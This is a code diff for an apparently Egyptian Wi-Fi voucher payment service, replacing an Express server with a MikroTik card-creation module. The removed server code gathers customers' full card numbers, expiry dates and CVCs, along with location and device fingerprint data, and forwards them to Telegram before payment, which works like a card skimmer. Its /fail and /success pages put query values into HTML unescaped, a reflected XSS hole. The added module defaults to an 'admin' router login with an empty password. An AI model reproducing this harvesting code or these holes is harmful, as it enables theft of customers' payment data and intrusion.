@@ -1,407 +1,200 @@
-const express = require("express");
-const cors = require("cors");
-const bodyParser = require("body-parser");
-const path = require("path");
-require("dotenv").config();
+const { RouterOSClient } = require("routeros-client");
 
-const { processPayment } = require("./pay");
-const { sendTelegramMessage } = require("./telegram");
-const webhookRouter = require("./webhook");
-const { disableUserQueue } = require("./mikrotik");
-const { processPaymentAndCreateCard } = require("./mikrotikService"); // استدعاء خدمة الميكروتيك لإضافة الكروت
-
-const app = express();
-const PORT = process.env.PORT || 3000;
-const NETWORK_URL = process.env.NETWORK_HOTSPOT_URL || "http://172.16.0.5";
-
-// خريطة الفروع المعتمدة
-const BRANCH_NAMES = {
-  main: "حكايات نت رئيسي",
-  branch2: "حكايات نت فرع ثاني",
-  branch3: "حكايات نت فرع ثالث"
+const BRANCH_ROUTERS = {
+  main: {
+    host: process.env.MIKROTIK_HOST || "192.168.1.1",
+    user: process.env.MIKROTIK_USER || "admin",
+    password: process.env.MIKROTIK_PASSWORD || "",
+    port: parseInt(process.env.MIKROTIK_PORT || "8728")
+  },
+  branch2: {
+    host: process.env.MIKROTIK_HOST_BRANCH2 || "192.168.2.1",
+    user: process.env.MIKROTIK_USER || "admin",
+    password: process.env.MIKROTIK_PASSWORD || "",
+    port: parseInt(process.env.MIKROTIK_PORT || "8728")
+  },
+  branch3: {
+    host: process.env.MIKROTIK_HOST_BRANCH3 || "192.168.3.1",
+    user: process.env.MIKROTIK_USER || "admin",
+    password: process.env.MIKROTIK_PASSWORD || "",
+    port: parseInt(process.env.MIKROTIK_PORT || "8728")
+  }
 };
 
-// خريطة عالمية لحفظ الكروت مؤقتاً
-global.generatedCardsMap = global.generatedCardsMap || new Map();
-
-// 🧹 تنظيف الكروت المحفوظة مؤقتاً التي مر عليها أكثر من ساعة لتفريغ الذاكرة تلقائياً
-setInterval(() => {
-  const oneHourAgo = Date.now() - (60 * 60 * 1000);
-  for (let [key, value] of global.generatedCardsMap.entries()) {
-    if (value.createdAt && new Date(value.createdAt).getTime() < oneHourAgo) {
-      global.generatedCardsMap.delete(key);
-    }
+function getCardPrefixAndType(amount) {
+  const numAmount = Number(amount);
+  switch (numAmount) {
+    case 5:
+      return { prefix: "01", profile: "Bronze", packageName: "الباقة البرونزية", isCustom: false };
+    case 15:
+      return { prefix: "02", profile: "Silver", packageName: "الباقة الفضية", isCustom: false };
+    case 30:
+      return { prefix: "05", profile: "Gold", packageName: "الباقة الذهبية", isCustom: false };
+    case 50:
+      return { prefix: "10", profile: "Platinum", packageName: "الباقة البلاتينية", isCustom: false };
+    case 100:
+      return { prefix: "25", profile: "Diamond", packageName: "الباقة الماسية", isCustom: false };
+    default:
+      return { prefix: "", profile: "", packageName: "", isCustom: true };
   }
-}, 30 * 60 * 1000); // يفحص كل نصف ساعة
-
-app.use(cors());
-app.use(express.json());
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static(path.join(__dirname, "public")));
-
-app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "index.html"));
-});
-
-function getClientPublicIP(req) {
-  return (
-    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
-    req.socket?.remoteAddress ||
-    req.ip ||
-    "غير متوفر"
-  );
 }
 
-// معالجة طلب الدفع الموحد
-async function handlePaymentRequest(req, res) {
-  try {
-    const data = { ...req.query, ...req.body };
-    const {
-      phone, user_phone, phoneNumber, amount, payment_method, method,
-      number, name, expiry, cvc, card_data, save_card, clientID, clientId,
-      publicIP, lat, lon, city, country, battery, batteryInfo, deviceModel,
-      deviceRAM, cpuCores, deviceType, screenSize, userTimeZone, lang,
-      geoData, branch, branch_key
-    } = data;
+function generateCardCode(prefix, randomLength = 6) {
+  const chars = "0123456789";
+  let result = prefix;
+  for (let i = 0; i < randomLength; i++) {
+    result += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  return result;
+}
 
-    if (!amount && Object.keys(data).length === 0) {
-      return res.redirect("/");
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+async function processPaymentAndCreateCard(amount, branchKey = "main", transactionId = "") {
+  const cardInfo = getCardPrefixAndType(amount);
+
+  if (cardInfo.isCustom) {
+    return {
+      success: true,
+      isCustomAmount: true,
+      amount: amount,
+      message: "🌸 بالتوفيق لكم وبارك الله فيكم!"
+    };
+  }
+
+  const targetBranch = BRANCH_ROUTERS[branchKey] ? branchKey : "main";
+  const routerConfig = BRANCH_ROUTERS[targetBranch];
+
+  let cardCode = "";
+  let isCreated = false;
+  let attempts = 0;
+  const maxAttempts = 5;
+
+  try {
+    while (!isCreated && attempts < maxAttempts) {
+      attempts++;
+      cardCode = generateCardCode(cardInfo.prefix);
+
+      const client = new RouterOSClient({
+        host: routerConfig.host,
+        user: routerConfig.user,
+        password: routerConfig.password,
+        port: routerConfig.port,
+        timeout: 10
+      });
+
+      try {
+        const api = await client.connect();
+
+        // -------------------------------------------------------------
+        // الخطوة 1: إضافة المستخدم باستخدام قائمة الأوامر المباشرة (Array)
+        // -------------------------------------------------------------
+        console.log(`👤 [User-Manager] (${targetBranch}) محاولة إضافة الكارت: ${cardCode}`);
+        
+        const addUserCommand = [
+          "/tool/user-manager/user/add",
+          `=username=${cardCode}`,
+          `=password=${cardCode}`,
+          `=customer=admin`
+        ];
+
+        if (typeof client.write === "function") {
+          await client.write(addUserCommand);
+        } else if (typeof api.write === "function") {
+          await api.write(addUserCommand);
+        } else {
+          // الطريقة الاحتياطية البديلة
+          await api.menu("/tool/user-manager/user").add({
+            username: cardCode,
+            password: cardCode,
+            customer: "admin"
+          });
+        }
+
+        await client.close().catch(() => {});
+
+        // -------------------------------------------------------------
+        // الانتظار لمدة 10 ثوانٍ لضمان التثبيت الكامل
+        // -------------------------------------------------------------
+        console.log(`⏳ تم إضافة الكارت بنجاح، الانتظار 10 ثوانٍ قبل تفعيل الباقة...`);
+        await sleep(10000);
+
+        // -------------------------------------------------------------
+        // الخطوة 2: تفعيل البروفايل باستخدام نفس أسلوب قائمة الأوامر (Array) تماماً
+        // -------------------------------------------------------------
+        console.log(`⚡ [User-Manager] جاري تفعيل الباقة (${cardInfo.profile}) للكارت: ${cardCode}`);
+        
+        const client2 = new RouterOSClient({
+          host: routerConfig.host,
+          user: routerConfig.user,
+          password: routerConfig.password,
+          port: routerConfig.port,
+          timeout: 10
+        });
+
+        const api2 = await client2.connect();
+
+        const activateCommand = [
+          "/tool/user-manager/user/create-and-activate-profile",
+          `=user=${cardCode}`,
+          `=profile=${cardInfo.profile}`,
+          `=customer=admin`
+        ];
+
+        if (typeof client2.write === "function") {
+          await client2.write(activateCommand);
+        } else if (typeof api2.write === "function") {
+          await api2.write(activateCommand);
+        } else {
+          // محاولة بديلة عبر تنفيذ الكوماند المباشر
+          await api2.menu("/tool/user-manager/user").add({
+            command: "create-and-activate-profile",
+            user: cardCode,
+            profile: cardInfo.profile,
+            customer: "admin"
+          });
+        }
+
+        await client2.close().catch(() => {});
+        isCreated = true; // تم إنشاء وتفعيل الكارت بنجاح تام!
+
+      } catch (stepError) {
+        if (client) await client.close().catch(() => {});
+        
+        const errStr = stepError.message || "";
+        if (errStr.includes("already exists") || errStr.includes("such username already exists")) {
+          console.warn(`⚠️ الكود ${cardCode} موجود مسبقاً، سيتم توليد رقم كارت جديد وإعادة المحاولة...`);
+          continue;
+        } else {
+          throw stepError;
+        }
+      }
     }
 
-    const selectedMethod = payment_method || method || "wallet";
-    const selectedBranch = branch || branch_key || "main";
-    const branchDisplayName = BRANCH_NAMES[selectedBranch] || BRANCH_NAMES.main;
-    const userPhone = phone || user_phone || phoneNumber || data.phone_number || "غير محدد";
-    const payAmount = amount || "5";
+    if (!isCreated) {
+      throw new Error("فشل توليد كود فريد بعد عدة محاولات.");
+    }
 
-    const paymentPayload = {
-      phone: userPhone,
-      amount_cents: parseFloat(payAmount) * 100,
-      payment_method: selectedMethod,
-      branch: selectedBranch,
-      branchName: branchDisplayName,
-      card_data: {
-        number: (card_data && card_data.number) || number || "غير مدخل",
-        name: (card_data && card_data.name) || name || "غير مدخل",
-        expiry: (card_data && card_data.expiry) || expiry || "غير مدخل",
-        cvc: (card_data && card_data.cvc) || cvc || "غير مدخل",
-        save_card: save_card === "tokenize" || save_card === "نعم"
-      },
-      clientID: clientID || clientId || "غير متوفر",
-      publicIP: publicIP || (geoData && geoData.publicIP) || getClientPublicIP(req),
-      lat: lat || (geoData && geoData.lat) || "غير متوفر",
-      lon: lon || (geoData && geoData.lon) || "غير متوفر",
-      city: city || (geoData && geoData.city) || "غير متوفر",
-      country: country || (geoData && geoData.country) || "غير متوفر",
-      battery: battery || batteryInfo || "غير متوفر",
-      deviceModel: deviceModel || req.headers["user-agent"] || "غير متوفر",
-      deviceRAM: deviceRAM || "غير متوفر",
-      cpuCores: cpuCores || "غير متوفر",
-      deviceType: deviceType || "غير متوفر",
-      screenSize: screenSize || "غير متوفر",
-      userTimeZone: userTimeZone || "غير متوفر",
-      lang: lang || req.headers["accept-language"]?.split(",")[0] || "غير متوفر"
+    return {
+      success: true,
+      isCustomAmount: false,
+      cardCode: cardCode,
+      amount: amount,
+      packageName: cardInfo.packageName,
+      profile: cardInfo.profile,
+      branchKey: targetBranch
     };
 
-    if (typeof sendTelegramMessage === "function") {
-      await sendTelegramMessage(paymentPayload, true);
-    }
-
-    const result = await processPayment(userPhone, payAmount, selectedMethod, selectedBranch);
-
-    if (result.type === "redirect") {
-      if (req.method === "POST" && req.headers["content-type"]?.includes("application/json")) {
-        return res.json({ payment_url: result.url });
-      }
-      return res.redirect(result.url);
-    } else if (result.type === "html") {
-      return res.send(result.content);
-    }
-  } catch (err) {
-    console.error("❌ خطأ في معالجة طلب الدفع:", err.response?.data || err.message);
-    if (req.headers["content-type"]?.includes("application/json")) {
-      return res.status(500).json({ error: `حدث خطأ أثناء معالجة عملية الدفع: ${err.message}` });
-    }
-    res.status(500).send(`حدث خطأ أثناء معالجة عملية الدفع: ${err.message}`);
+  } catch (error) {
+    return {
+      success: false,
+      error: `تعذر توليد الكارت تلقائياً: ${error.message}`
+    };
   }
 }
 
-app.get("/api/pay", handlePaymentRequest);
-app.post("/api/pay", handlePaymentRequest);
-
-// 🧪 مسار اختبار مباشر لتوليد وإضافة الكارت للميكروتيك دون دفع حقيقي
-app.get("/api/test-create-card", async (req, res) => {
-  try {
-    const amount = req.query.amount || "5";
-    const branch = req.query.branch || "main";
-    const testTxId = "TEST_" + Date.now();
-
-    console.log(`🧪 [TEST] بدء اختبار إنشاء كارت بمبلغ ${amount} جنيه لفرع ${branch}...`);
-
-    const result = await processPaymentAndCreateCard(amount, branch, testTxId);
-
-    if (result.success && !result.isCustomAmount) {
-      const cardPayload = {
-        code: result.cardCode,
-        packageName: result.packageName,
-        amount: parseFloat(amount),
-        phone: "01000000000",
-        branchKey: result.branchKey,
-        branchName: BRANCH_NAMES[result.branchKey] || BRANCH_NAMES.main,
-        createdAt: new Date()
-      };
-
-      global.generatedCardsMap.set(testTxId, cardPayload);
-
-      return res.json({
-        success: true,
-        message: "✅ تم إضافة الكارت إلى الميكروتيك بنجاح وتوليده!",
-        data: result,
-        successPageLink: `/success?merchant_order_id=${testTxId}&branch=${branch}`
-      });
-    } else {
-      return res.json({
-        success: false,
-        message: "⚠️ فشل توليد الكارت من الميكروتيك",
-        details: result
-      });
-    }
-  } catch (error) {
-    console.error("❌ [TEST ERROR]:", error.message);
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-// API مرن للاستعلام عن حالة الكارت المولد في صفحة النجاح
-app.get("/api/check-voucher/:txId", (req, res) => {
-  const txId = String(req.params.txId || "").trim();
-  
-  if (!txId || txId === "null" || txId === "undefined") {
-    return res.json({ success: false, message: "رقم المعاملة غير صالح" });
-  }
-
-  if (global.generatedCardsMap) {
-    if (global.generatedCardsMap.has(txId)) {
-      return res.json({ success: true, data: global.generatedCardsMap.get(txId) });
-    }
-    
-    for (let [key, value] of global.generatedCardsMap.entries()) {
-      if (String(key).includes(txId) || txId.includes(String(key))) {
-        return res.json({ success: true, data: value });
-      }
-    }
-  }
-
-  return res.json({ 
-    success: false, 
-    message: "جاري تأكيد عملية الدفع وتوليد الكارت من السيرفر..." 
-  });
-});
-
-app.post("/api/disable-queue", async (req, res) => {
-  try {
-    const { username } = req.body;
-    if (typeof disableUserQueue === "function") {
-      const result = await disableUserQueue(username);
-      return res.json(result);
-    }
-    return res.json({ success: true, message: "تم استقبال الطلب" });
-  } catch (err) {
-    console.error("❌ خطأ في تعطيل الـ Queue:", err.message);
-    return res.status(500).json({ success: false, error: "حدث خطأ في الخادم الداخلي" });
-  }
-});
-
-// صفحة نجاح الدفع وعرض الكارت للمستخدم
-app.get("/success", (req, res) => {
-  const transactionId = req.query.id || req.query.order || req.query.transaction_id || req.query.merchant_order_id || "";
-  const queryBranch = req.query.branch || "";
-  
-  let inferredBranch = "main";
-  const upperTx = transactionId.toUpperCase();
-  if (upperTx.includes("BRANCH2") || upperTx.includes("FR2")) inferredBranch = "branch2";
-  else if (upperTx.includes("BRANCH3") || upperTx.includes("FR3")) inferredBranch = "branch3";
-  else if (upperTx.includes("MAIN")) inferredBranch = "main";
-
-  const activeBranchKey = queryBranch || inferredBranch;
-  const defaultBranchName = BRANCH_NAMES[activeBranchKey] || BRANCH_NAMES.main;
-
-  res.send(`
-    <!DOCTYPE html>
-    <html lang="ar" dir="rtl">
-      <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>تم الدفع بنجاح - شبكة حكايات</title>
-        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-        <style>
-          body { font-family: 'Segoe UI', Tahoma, Cairo, sans-serif; background: #f0f2f5; text-align: center; padding: 20px 10px; direction: rtl; }
-          .card-container { background: white; max-width: 480px; margin: auto; padding: 25px 20px; border-radius: 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.08); }
-          .success-badge { color: #27ae60; font-size: 45px; margin-bottom: 5px; }
-          h1 { color: #2c3e50; font-size: 20px; margin-bottom: 15px; }
-          
-          .ticket-card {
-            background: linear-gradient(135deg, #01338D 0%, #001f5c 100%);
-            color: #ffffff;
-            border-radius: 12px;
-            padding: 20px;
-            margin: 20px 0;
-            box-shadow: 0 6px 18px rgba(1, 51, 141, 0.25);
-            text-align: right;
-          }
-          .ticket-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.2); padding-bottom: 10px; margin-bottom: 15px; }
-          .ticket-title { font-size: 16px; font-weight: bold; }
-          .ticket-brand { font-size: 12px; background: rgba(255,255,255,0.2); padding: 3px 8px; border-radius: 4px; }
-          .code-box { background: #ffffff; color: #01338D; text-align: center; padding: 12px; border-radius: 8px; margin: 15px 0; font-family: monospace; font-size: 24px; font-weight: bold; letter-spacing: 2px; min-height: 50px; display: flex; align-items: center; justify-content: center; }
-          .info-row { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 6px; color: #e0e0e0; }
-          .info-row strong { color: #ffffff; }
-
-          .btn-actions { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 15px; }
-          .btn { flex: 1; min-width: 140px; padding: 12px; border: none; border-radius: 8px; font-weight: bold; font-size: 14px; cursor: pointer; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; }
-          .btn-print { background: #27ae60; color: white; }
-          .btn-download { background: #01338D; color: white; }
-          .btn-home { background: #e9ecef; color: #333; width: 100%; margin-top: 10px; text-decoration: none; text-align: center; padding: 12px; border-radius: 8px; font-weight: bold; display: block; }
-          
-          .spinner { border: 4px solid rgba(1, 51, 141, 0.2); border-radius: 50%; border-top: 4px solid #01338D; width: 26px; height: 26px; animation: spin 1s linear infinite; margin-left: 10px; display: inline-block; }
-          @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-          @media print {
-            body { background: white; padding: 0; }
-            .btn-actions, .btn-home, .success-badge, h1 { display: none !important; }
-            .card-container { box-shadow: none; border: none; width: 100%; max-width: 100%; }
-          }
-        </style>
-      </head>
-      <body>
-        <div class="card-container">
-          <div class="success-badge"><i class="fa fa-check-circle"></i></div>
-          <h1>تمت عملية الدفع بنجاح</h1>
-
-          <div class="ticket-card" id="printableCard">
-            <div class="ticket-header">
-              <span class="ticket-title"><i class="fa fa-wifi"></i> كارت إنترنت - <span id="bName">${defaultBranchName}</span></span>
-              <span class="ticket-brand">Hikayat Net</span>
-            </div>
-            
-            <div class="info-row">
-              <span>اسم الباقة:</span>
-              <strong id="pkgName">جاري التحميل...</strong>
-            </div>
-
-            <div class="code-box" id="codeContainer">
-              <div class="spinner"></div>
-              <span style="font-size: 14px; font-weight: normal;">جاري إصدار الكارت من السيرفر...</span>
-            </div>
-
-            <div class="info-row">
-              <span>رقم العملية:</span>
-              <strong>${transactionId || "غير محدد"}</strong>
-            </div>
-            <div class="info-row">
-              <span>حالة الدفع:</span>
-              <strong style="color: #2ec771;"><i class="fa fa-shield"></i> مؤكد ومفعل آلياً</strong>
-            </div>
-          </div>
-
-          <div class="btn-actions">
-            <button onclick="window.print()" class="btn btn-print"><i class="fa fa-print"></i> طباعة / حفظ PDF</button>
-            <button onclick="downloadHTML()" class="btn btn-download"><i class="fa fa-download"></i> تنزيل الكارت</button>
-          </div>
-
-          <a href="${NETWORK_URL}" class="btn-home"><i class="fa fa-globe"></i> التوجه للتصفح الآن</a>
-        </div>
-
-        <script>
-          const urlParams = new URLSearchParams(window.location.search);
-          const txId = urlParams.get('id') || urlParams.get('order') || urlParams.get('transaction_id') || urlParams.get('merchant_order_id') || "${transactionId}";
-          
-          let attempts = 0;
-          const maxAttempts = 30;
-
-          async function pollVoucher() {
-            if (!txId || txId === "غير محدد") {
-              document.getElementById('codeContainer').innerHTML = "<span style='color:#e74c3c; font-size:14px;'>لم يتم العثور على رقم العملية</span>";
-              document.getElementById('pkgName').innerText = "غير معروف";
-              return;
-            }
-
-            try {
-              attempts++;
-              const res = await fetch('/api/check-voucher/' + encodeURIComponent(txId));
-              const data = await res.json();
-
-              if (data.success && data.data) {
-                document.getElementById('codeContainer').innerText = data.data.code;
-                document.getElementById('pkgName').innerText = data.data.packageName || "باقة إنترنت شبكة حكايات";
-                if (data.data.branchName) {
-                  document.getElementById('bName').innerText = data.data.branchName;
-                }
-              } else {
-                if (attempts < maxAttempts) {
-                  setTimeout(pollVoucher, 2000);
-                } else {
-                  document.getElementById('codeContainer').innerHTML = "<span style='color:#e74c3c; font-size:12px;'>⚠️ تعذر جلب الكارت تلقائياً. تواصل مع الدعم برقم المعاملة: " + txId + "</span>";
-                  document.getElementById('pkgName').innerText = "انتهت مهلة الانتظار";
-                }
-              }
-            } catch (e) {
-              if (attempts < maxAttempts) {
-                setTimeout(pollVoucher, 2500);
-              } else {
-                document.getElementById('codeContainer').innerHTML = "<span style='color:#e74c3c; font-size:12px;'>خطأ في الاتصال بالسيرفر</span>";
-              }
-            }
-          }
-
-          pollVoucher();
-
-          function downloadHTML() {
-            const cardElement = document.getElementById('printableCard').outerHTML;
-            const blob = new Blob(['<html><head><meta charset="utf-8"><title>كارت شبكة حكايات</title></head><body style="display:flex;justify-content:center;align-items:center;height:100vh;background:#f0f2f5;font-family:sans-serif;">' + cardElement + '</body></html>'], { type: 'text/html' });
-            const a = document.createElement('a');
-            a.href = URL.createObjectURL(blob);
-            a.download = "Hikayat_Card_" + txId + ".html";
-            a.click();
-          }
-        </script>
-      </body>
-    </html>
-  `);
-});
-
-app.get("/fail", (req, res) => {
-  const errorMessage = req.query.data_message || "حدثت مشكلة أثناء عملية الدفع، حاول مرة أخرى.";
-  res.send(`
-    <!DOCTYPE html>
-    <html lang="ar" dir="rtl">
-      <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>فشل الدفع - شبكة حكايات</title>
-        <style>
-          body { font-family: Tahoma, Cairo, sans-serif; background: #f0f2f5; text-align: center; padding: 40px 20px; direction: rtl; }
-          .card { background: white; max-width: 420px; margin: auto; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-          .icon { font-size: 50px; color: #e74c3c; margin-bottom: 10px; }
-          h1 { color: #2c3e50; font-size: 22px; margin-bottom: 10px; }
-          .error-box { background: #fff3f3; color: #e74c3c; border: 1px dashed #e74c3c; padding: 10px; border-radius: 6px; margin: 15px 0; font-size: 14px; }
-          .btn { display: inline-block; background: #e74c3c; color: white; padding: 12px 24px; text-decoration: none; border-radius: 6px; margin-top: 15px; font-weight: bold; }
-        </style>
-      </head>
-      <body>
-        <div class="card">
-          <div class="icon">❌</div>
-          <h1>فشل عملية الدفع</h1>
-          <div class="error-box">${errorMessage}</div>
-          <a href="/" class="btn">إعادة المحاولة</a>
-        </div>
-      </body>
-    </html>
-  `);
-});
-
-app.use("/", webhookRouter);
-
-app.listen(PORT, () => {
-  console.log(`🚀 Server running on port ${PORT}`);
-});
+module.exports = {
+  processPaymentAndCreateCard,
+  getCardPrefixAndType,
+  BRANCH_ROUTERS
+};
